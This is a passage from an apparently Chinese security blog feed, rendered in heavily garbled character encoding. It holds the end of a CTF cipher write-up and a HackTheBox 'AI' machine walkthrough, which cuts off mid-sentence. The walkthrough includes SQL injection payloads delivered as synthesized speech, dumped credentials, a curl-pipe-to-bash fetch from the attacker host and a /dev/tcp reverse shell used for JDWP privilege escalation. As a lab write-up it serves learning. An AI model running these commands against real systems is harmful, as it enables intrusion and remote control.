‡æ³¨äº†pixivã€‚ã€‚ã€‚ä¼°è®¡æ˜¯è¦æ”¹æˆå‹ç¼©åŒ…äº†ï¼Œæ‰€ä»¥ä¹Ÿæ²¡å»çœ‹æœ‰æ²¡æœ‰å‹ç¼©åŒ…æ–‡ä»¶ï¼Œå¤´å°±ç›´æ¥æ”¹zipï¼Œæœä¸å…¶ç„¶æ˜¯å‹ç¼©åŒ…ï¼Œå†…å®¹ä¸ºflag.txtï¼Œéœ€è¦å¯†ç ã€‚é‚£å°±ç›´æ¥ä¸Špç«™æ‰¾è¿™ä¸ªç”»å¸ˆå§ï¼ˆæ„Ÿè§‰åƒäº†ä¸€æ³¢å¼ºè¡Œå®‰åˆ©å•Šï¼‰æ‰¾åˆ°å›¾ç‰‡åç”¨å¯†ç çœ‹flag.txtï¼Œæœ€åç»“æœasciiè§£ç ä¸€ä¸‹å°±å¥½ã€‚</p><h2 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h2><p>ä¸€æ—¶å…´èµ·è¿˜æ˜¯çœ‹äº†çœ‹è¿™é“miscã€‚ä¸Šæ¥å…ˆç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹</p><pre><code>Rdjxfwxjfimknâ€‚z,tsâ€‚wntziâ€‚xtjrwmâ€‚xsfjtâ€‚jmâ€‚ywtâ€‚rtntwhfâ€‚fâ€‚yâ€‚â€‚â€‚hâ€‚jnsxfâ€‚qjFjfâ€‚jnbâ€‚â€‚rgâ€‚fiyykwtbsnkmâ€‚tmâ€‚â€‚xaâ€‚jsdwqjfmkjyâ€‚wlviHtqzqsGsffywjjyynfâ€‚yssmâ€‚xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fenses first, Five Caesar next. English sentense first,  zip password next.</code></pre><p>çœ‹åˆ°fencesè·Ÿceaserå°±æƒ³åˆ°äº†æ …æ è·Ÿå‡¯æ’’å¯†ç äº†ã€‚åŠ ä¸Šæç¤ºå…ˆ3æ …æ ï¼Œå†5å‡¯æ’’ï¼Œé‚£ä¹ˆåœ¨çº¿è§£ä¸‹ç ï¼Œå¯¹åº”ç»„æ•°ä¸åç§»æ•°åˆ†åˆ«ä¸º3,5å³å¯ã€‚è§£å‡ºæ¥å‰é¢ä¸€å¥è¯å¦‚ä¸‹ï¼š<br>Manyâ€‚yearsâ€‚laterâ€‚asâ€‚heâ€‚facedâ€‚theâ€‚firingâ€‚squad,â€‚Colonelâ€‚Aurelianoâ€‚Buendiaâ€‚wasâ€‚toâ€‚rememberâ€‚thatâ€‚distantâ€‚afternoonâ€‚whenâ€‚hisâ€‚fatherâ€‚tookâ€‚himâ€‚toâ€‚discoverâ€‚ice.<br>å‡ºè‡ªç™¾å¹´å­¤ç‹¬ï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚è§£å‡ºçš„å¯†ç ç”¨æ¥è§£å‹åŠ å¯†çš„å‹ç¼©åŒ…ï¼Œå¾—åˆ°æ–‡æ¡£</p><pre><code>data:text;ook,Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.............</code></pre><p>æœ‰ç‚¹æ‘¸ä¸ç€å¤´è„‘ï¼Œäºæ˜¯è°·æ­Œä¸€ä¸‹ï¼Œå‘ç°è¿™æ˜¯å±äºbrainfuckç¼–ç ä¸­çš„ä¸€ç§ï¼Œä¸ç¦è®©æˆ‘è”æƒ³åˆ°äº†åŸæ¥ä¼¤çœ¼ç›çš„jsfuckç¼–ç â€¦â€¦é‚£ä¹ˆåœ¨çº¿è§£ç ä¸€ä¸‹ï¼ˆæ‰¾ä¸ªå¥½ç‚¹çš„ç½‘ç«™ï¼Œå¼€å§‹æˆ‘æ‰¾çš„ç½‘ç«™åªè§£äº†ä¸€éƒ¨åˆ†ï¼‰ï¼Œå¾—åˆ°base32ç¼–ç ã€‚å†base32è§£ç ï¼Œå‘ç°å¾—åˆ°çš„ç»“æœå¯ä»¥è¿›è¡Œbase64è§£ç ï¼Œä¸”ç»“æœå¼€å¤´æœ‰å›¾ç‰‡çš„æ–‡ä»¶å¤´ã€‚é‚£ä¹ˆå¯ä»¥ç¡®è®¤æ˜¯å›¾ç‰‡æ–‡ä»¶å†…å®¹è¿›è¡Œäº†base64ç¼–ç ã€‚é‚£ç›´æ¥è§£å‡ºæ–‡ä»¶å°±å¥½äº†ï¼ˆå¯ä»¥ç”¨pythonï¼Œä¹Ÿå¯ä»¥åœ¨çº¿ï¼‰ã€‚å¾—åˆ°äºŒç»´ç ï¼Œç›´æ¥æ‰«ç å¾—flagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-AIâ€”â€”æœ‰è¶£çš„sql+JDWPgetshell</title>
      <link href="2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/"/>
      <url>2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºåˆç­‰åˆ°hacktheboxæ›´æ–°é€€å½¹é¶æœºäº†ï¼Œè¿™æ¬¡çš„é¶æœºæ˜¯AIã€‚å› ä¸ºæ¯”è¾ƒæœ‰æ„æ€æ‰€ä»¥æ¥è®°å½•ä¸‹ã€‚ä¸è¿‡è¿‡ç¨‹å¹¶éä¸€å¸†é£é¡ºã€‚å…¶ä¸­è¿˜é‡åˆ°é¶æœºç£ç›˜å†™æ»¡å¯¼è‡´æ— æ³•å†™å…¥æ–‡ä»¶çš„äº‹ã€‚åˆ äº†åŠå¤©æ‰æƒ³èµ·æ¥è¦é‡è®¾é¶æœºâ€¦â€¦</p><p>è·Ÿä¸Šæ¬¡ä¸€æ ·å‚è€ƒäº†ä¸‹å¤§ç¥çš„è§†é¢‘<a href="https://www.youtube.com/watch?v=7n7YRntu3bc&t=1391s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s</a>è§†é¢‘çœŸçš„éå¸¸è‰¯å¿ƒã€‚</p><a id="more"></a><p>(è¿™æ¬¡åšä¹‹å‰æ›´æ–°kaliè™šæ‹Ÿæœº,åˆæŠŠè‡ªå·±çš„è™šæ‹Ÿæœºå¼„æ­»æœºäº†â€¦â€¦å¥½åœ¨ç°åœ¨ä¸é‚£ä¹ˆå®¹æ˜“æ•´ä½“ç‚¸æ‰ï¼Œå€’æ˜¯kaliçš„ç•Œé¢è¶Šæ›´æ–°è¶Šèˆ’é€‚ï¼ŒæŒºä¸é”™çš„)<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a12.PNG" class="lazyload" data-srcset="a12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="AI"></p><p><strong>æœ¬æœºip:10.10.15.60</strong></p><p><strong>é¶æœºip:10.10.10.163</strong></p><p>é¦–å…ˆç¬¬ä¸€æ­¥å½“ç„¶æ˜¯æ¢æµ‹ç«¯å£äº†</p><pre><code>namp -sC -sV -oA ai 10.10.10.163</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a1.PNG" class="lazyload" data-srcset="a1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nmap"></p><p>å‘ç°æœ‰22ä¸80ç«¯å£å¼€æ”¾ã€‚æ—¢ç„¶æœ‰httpæœåŠ¡ï¼Œé‚£å°±å°è¯•ç›´æ¥è®¿é—®å§ã€‚<br>æœ‰ä¸€ä¸ªä¸»é¡µé¢ã€‚åŒæ—¶ä¹Ÿå‘ç°äº†å…¶ä»–phpæ–‡ä»¶ï¼Œå”¯ä¸€æ¯”è¾ƒæœ‰æ„æ€çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ª<code>ai.php</code>é¡µé¢ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a2.PNG" class="lazyload" data-srcset="a2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ai"></p><p>ä½†æ˜¯å¾ˆå¥‡æ€ªã€‚å±…ç„¶æ˜¯<code>.wav</code>fileã€‚é€šå¸¸æˆ‘æ‰€çŸ¥é“çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ä¹Ÿå°±å›¾ç‰‡é©¬æˆ–è€…pharååºåˆ—åŒ–æˆ–è€…å…¶ä»–ç±»å‹çš„getshellã€‚è€Œå®ƒæç¤ºçš„drop your query using wav file.ä¼¼ä¹æ˜¯åœ¨è¯´æ˜æˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŸ¥è¯¢æ“ä½œã€‚</p><p>é‚£ä¹ˆé¦–å…ˆéšä¾¿ä¼ ä¸€ä¸ªtest.phpä¸Šå»ã€‚å†…å®¹éšæ„ã€‚å‘ç°æ²¡æœ‰å›æ˜¾ã€‚<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a3.PNG" class="lazyload" data-srcset="a3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p><p>çœ‹æ¥æ˜¯è¦<code>wav</code>çš„éŸ³é¢‘æ–‡ä»¶äº†ã€‚ä½¿ç”¨éŸ³é¢‘æ–‡ä»¶æ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿™ç‚¹çœŸçš„éš¾ä»¥å¼„æ‡‚ã€‚é‚£ä¹ˆåœ¨å°è¯•å¼„æ¸…æ¼æ´ç±»å‹ä¹‹å‰å…ˆæ¥ç›®å½•çˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ä¿¡æ¯ï¼š</p><pre><code>gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php</code></pre><p>åŸºäºè¿™é‡Œéƒ½æ˜¯phpï¼Œæˆ‘ä»¬åœ¨gobusteråç€é‡åŠ ä¸Š<code>-x php</code>è¿›è¡Œç­›é€‰ã€‚<br>è§£æœå¤§è‡´å¦‚ä¸‹ï¼š</p><pre><code>/index.php (Status: 200)/contact.php (Status: 200)/about.php (Status: 200)/images (Status: 301)/uploads (Status: 301)/db.php (Status:301)/intelligence.php(Status: 200)/ai.php(Status: 200)</code></pre><p>å…¶ä¸­ai.phpç­‰ç­‰éƒ½æ˜¯ä¸»é¡µé¢å°±æä¾›äº†çš„ã€‚æ–°å‘ç°çš„é¡µé¢åŒ…æ‹¬<code>intelligence.php</code>è·Ÿ<code>db.php</code>ã€‚ä¸Šä¼ è·Ÿå›¾ç‰‡ç•Œé¢æˆ‘ä»¬éƒ½æ²¡æœ‰æƒé™è¿›å»ã€‚é‚£ä¹ˆè®¿é—®ä¸‹å”¯ä¸€å¯ä»¥è®¿é—®çš„<code>intelligence.php</code><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a4.PNG" class="lazyload" data-srcset="a4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="intelligence.php"></p><p>å‘ç°äº†è¿™ä¸ªé¡µé¢ã€‚ä¼¼ä¹å­˜åœ¨ç€è¯è¯­çš„æ›¿æ¢å…³ç³»ã€‚ä»è¡¨çš„å³åˆ—ä¸­æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°ä¸€äº›ç†Ÿæ‚‰çš„ç¬¦å·â€“<code>union</code>,<code>#</code>,<code>---</code>,<code>Schema</code>ç­‰ç­‰ã€‚è¿™äº›éƒ½æ˜¯å¸¸å¸¸å‡ºç°åœ¨<strong>sqlæ³¨å…¥</strong>ä¸­çš„ç¬¦å·ã€‚ç»“åˆæˆ‘ä»¬è¿˜çˆ†ç ´å‡ºäº†db.phpï¼Œå¯ä»¥çŒœæƒ³æ˜¯å¦æœ‰sqlæ³¨å…¥çš„æ¼æ´å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯æ­£ç¡®çš„ã€‚è€Œä¸”è„‘æ´å¤§å¼€çš„æ˜¯ï¼šæˆ‘ä»¬è¦ç”¨è¯­è¨€è½¬æˆéŸ³é¢‘æ–‡ä»¶ä¸Šä¼ æ¥è¿›è¡Œæ³¨å…¥ã€‚è¿™ä¹Ÿè®¸å°±æ˜¯è¿™ä¸ªAIé¶æœºçš„åå­—æ‰€åœ¨å§ã€‚</p><p>é¦–å…ˆgoogle linux say commandï¼Œ å‘ç°æœ‰è¿™æ ·çš„ä¸€ä¸ªè½¯ä»¶ã€‚å«åšfestivalã€‚</p><pre><code>apt-get install festival</code></pre><p>ä½¿ç”¨å®ƒå…¶ä¸­ä¸€ä¸ªå«text2waveçš„å°±èƒ½å°†è¯­å¥è½¬æˆè¯­éŸ³æ–‡ä»¶ã€‚æ¯”å¦‚ç”¨ä¸‹ç®¡é“ç¬¦ï¼Œç”Ÿæˆä¸€ä¸ªtest.wavï¼Œå†…å®¹ä¸ºhelloã€‚</p><pre><code>echo &quot;Hello&quot;| text2wave -o test.wav</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a5.PNG" class="lazyload" data-srcset="a5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p><p>å°è¯•å¬ä¸‹è¿™ä¸ªéŸ³é¢‘ï¼Œå‘ç°æ˜¯ä¸ªç”·ä½éŸ³ï¼ˆä¹Ÿè®¸æ˜¯æœºå™¨åˆæˆéŸ³?ï¼‰ç„¶åå†æ¬¡å°è¯•ä¸Šä¼ <br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a6.PNG" class="lazyload" data-srcset="a6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hello"><br>å‘ç°inputæœ‰ç»“æœï¼Œé‚£ä¹ˆå°±å°è¯•ä¸‹ç¿»è¯‘æˆè‹±æ–‡æ¥sqlæ³¨å…¥å§ã€‚<br>(è¿™ç‚¹å¯¹éè‹±è¯­æ¯è¯­çš„å›½å®¶çš„äººåº”è¯¥éå¸¸ä¸å‹å¥½â€¦â€¦æ¯•ç«Ÿæœ‰äº›åé—¨çš„æ‹¬å·ä¹‹ç±»çš„è‹±æ–‡æˆ‘ä¹Ÿä¸å¤ªç†Ÿï¼‰</p><pre><code>( openparenthesis å·¦æ‹¬å·) closeparenthesis å³æ‹¬å·- hyphen   è¿å­—ç¬¦</code></pre><p>åŸºäºä¸€å¼€å§‹è¿˜æ¢æµ‹åˆ°çš„<code>intelligence.php</code>ä¸­æœ‰äº›å­—ç¬¦å¯¹åº”å…³ç³»ï¼Œä¸éš¾æƒ³åˆ°æˆ‘ä»¬éœ€è¦ä½¿ç”¨é‚£å¼ è¡¨æ¥ç»•è¿‡æ³¨å…¥<br>æ¯”å¦‚æˆ‘çš„å°è¯•payload</p><pre><code>&#39; union select database()---</code></pre><p>éœ€è¦æ¢ä½œ</p><pre><code>open single quote, join select , database open parenthesis close parenthesis comment database</code></pre><p>å†é‡å¤ä¸Šé¢ç”Ÿæˆtest.wavçš„æ“ä½œï¼Œå°±å¯ä»¥ä¸Šä¼ æ³¨å…¥ã€‚<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a7.PNG" class="lazyload" data-srcset="a7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="database"></p><p>åŸºäºhacktheboxæ˜“å¾—userçš„å°¿æ€§ï¼Œå¯ä»¥çŒœå‡ºä¸€å¼ usersè¡¨ç„¶åçˆ†å‡ºusernameè·Ÿpassword</p><pre><code>&#39;union select username from user---open single quote, join , select , username from users comment databaseopen single quote, join , select , password from users comment database</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a8.PNG" class="lazyload" data-srcset="a8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="username"><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a9.PNG" class="lazyload" data-srcset="a9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="password"></p><p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬çš„httpé¡µé¢å¹¶æ²¡æœ‰ä»€ä¹ˆè®©æˆ‘ä»¬ç™»å½•è¿›å»çš„æ–¹æ³•æˆ–é¡µé¢ã€‚åŸºäºä¹‹å‰çš„ç«¯å£æ¢æµ‹å‘ç°æœ‰sshå¼€æ”¾ï¼Œä¸å¦¨å°è¯•sshç™»å½•<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a10.PNG" class="lazyload" data-srcset="a10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ssh login"><br>æˆåŠŸç™»é™†ã€‚å¹¶ä¸”user.txtå°±åœ¨å½“å‰ç›®å½•ä¸‹ã€‚</p><p>ä¹‹åå°±æ˜¯å¸¸è§„ææƒçš„è¿‡ç¨‹äº†ã€‚</p><p>è¿™é‡Œå¼€å§‹å¯èƒ½ä¼šæƒ³åˆ°ä¹‹å‰æ²¡æˆåŠŸè®¿é—®çš„db.phpï¼Œåœ¨<code>/var/www/html</code>ä¸­çˆ†å‡ºå†…å®¹<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a11.PNG" class="lazyload" data-srcset="a11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="mysql"><br>å¯çŸ¥usernameä¸º<code>dbuser</code>,passwordä¸º<code>toor</code><br>è¿›å…¥mysqlå¯ç”¨çš„å°±å¤šäº†ã€‚ï¼ˆç„¶è€Œæˆ‘è¿›å»çš„æ—¶å€™åº“è¢«åˆ«äººåˆ äº†â€¦â€¦ï¼‰å®é™…ä¸Šå¯ä»¥çˆ†å‡ºä¹‹å‰alexaæ‰€åœ¨userè¡¨çš„å†…å®¹ä¸­</p><pre><code>username:rootpassword:H,Sq9t6}a&lt;)?q931</code></pre><p>ä½†æ˜¯sshç™»å½•å¹¶ä¸æˆåŠŸã€‚mysqlè¿™æ¡è·¯èµ°ä¸é€šã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå‘ç°ææƒçš„æ¼æ´ç‚¹å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œå°¤å…¶æ˜¯å¯¹æˆ‘è¿™æ ·çš„å°ç™½è€Œè¨€ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»dalaoè§†é¢‘é‚£å‘ç°äº†ä¸€ä¸ªå¾ˆå‰å®³çš„è„šæœ¬å¯ä»¥è§£å†³æˆ‘è‡ªå·±çš„æ¼æ´è®¤çŸ¥é—®é¢˜ã€‚<br><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a><br>åœ¨é¶æœºä¸Šä½¿ç”¨å…¶ä¸­çš„<code>linpeas.sh</code>ï¼Œè„šæœ¬å°±ä¼šè‡ªåŠ¨åˆ†æå¯èƒ½ææƒçš„æ¼æ´ç‚¹ã€‚ç€å®è§£å†³ä¸å°‘é—®é¢˜ã€‚ä¸è¿‡é€šå¸¸ç»“æœåˆè‡­åˆé•¿ï¼Œå¯èƒ½éœ€è¦è€å¿ƒæ‰¾ä¸€æ‰¾ã€‚<br>å…·ä½“æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæœ¬æœºgit cloneå¥½åï¼Œèµ·ä¸€ä¸ªpythonç›‘å¬ï¼ˆé»˜è®¤8000ç«¯å£ï¼‰</p><pre><code>python -m SimpleHTTPServer</code></pre><p>åœ¨é¶æœºä¸Šç›´æ¥curlåæ‰§è¡Œå°±å¥½äº†</p><pre><code>curl 10.10.15.60:8000/linpeas.sh | bash</code></pre><p>è¿™é‡Œä»linpeas.shçš„ç»“æœä¸­å¯ä»¥å‘ç°ä¸€ä¸ªJDWPçš„ç‚¹è¢«æ ‡çº¢äº†ã€‚<br>é‚£ä¹ˆjdwpæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æœç´¢ä¸€ä¸‹</p><blockquote><p>JDWPï¼ˆJava DEbugger Wire Protocolï¼‰ï¼šå³Javaè°ƒè¯•çº¿åè®®ï¼Œæ˜¯ä¸€ä¸ªä¸ºJavaè°ƒè¯•è€Œè®¾è®¡çš„é€šè®¯äº¤äº’åè®®ï¼Œå®ƒå®šä¹‰äº†è°ƒè¯•å™¨å’Œè¢«è°ƒè¯•ç¨‹åºä¹‹é—´ä¼ é€’çš„ä¿¡æ¯çš„æ ¼å¼ã€‚è¯´ç™½äº†å°±æ˜¯JVMæˆ–è€…ç±»JVMçš„è™šæ‹Ÿæœºéƒ½æ”¯æŒä¸€ç§åè®®ï¼Œé€šè¿‡è¯¥åè®®ï¼ŒDebugger ç«¯å¯ä»¥å’Œ target VM é€šä¿¡ï¼Œå¯ä»¥è·å–ç›®æ ‡ VMçš„åŒ…æ‹¬ç±»ã€å¯¹è±¡ã€çº¿ç¨‹ç­‰ä¿¡æ¯</p></blockquote><p>è€Œè¿™æ˜¯æœ‰æ¼æ´åˆ©ç”¨çš„ã€‚æ¯”å¦‚çŸ¥é“åˆ›å®‡ä¸Šçš„<br><a href="https://www.seebug.org/vuldb/ssvid-89216" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89216</a></p><p>ç­‰ç­‰ï¼Œéƒ½æ˜¯jdwpçš„ä»£ç æ‰§è¡Œæ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±ç”¨è¿™ä¸ªæ¼æ´ï¼Œå°è¯•æ‹¿åˆ°rootæƒé™ã€‚<br>é¦–å…ˆç¡®å®šä½¿ç”¨çš„å·¥å…·<br><a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p><p><code>jdwp-shellifier</code>(ä¸Šé¢å‡ ä¸ªæ¼æ´æŠ¥å‘Šéƒ½æ˜¯ç”¨çš„è¿™ä¸ªå·¥å…·)ä¹‹åè€ƒè™‘æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå½“ç„¶æ˜¯æ‹¿åˆ°root shellæ¯”è¾ƒå¥½ã€‚æ‰€ä»¥å…ˆåœ¨alexaçš„é¶æœºçš„tmpç›®å½•ä¸‹æ”¾ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬test.shå†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>#!/bin/bashbash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/9002 0&gt;&amp;1&#39;</code></pre><p>ç„¶åç»™å…¶æ‰§è¡Œçš„æƒé™</p><pre><code>chmod +x test.sh</code></pre><p>è°ƒç”¨æ—¶åªéœ€ï¼š</p><pre><code>./test.sh</code></pre><p>å…ˆæœ¬æœºç›‘å¬ä¸‹ï¼Œæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¼¹åˆ°alexaçš„shellã€‚</p><p>æ¥ä¸‹æ¥ç”¨åˆ°ä¸€ä¸ªæ–°å­¦åˆ°çš„å¤§æ‹›ï¼šç«¯å£è½¬å‘ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ¯æ¬¡sshç™»å½•è¿™ä¸€é¶æœºéƒ½è¦ç”¨æˆ·å¯†ç 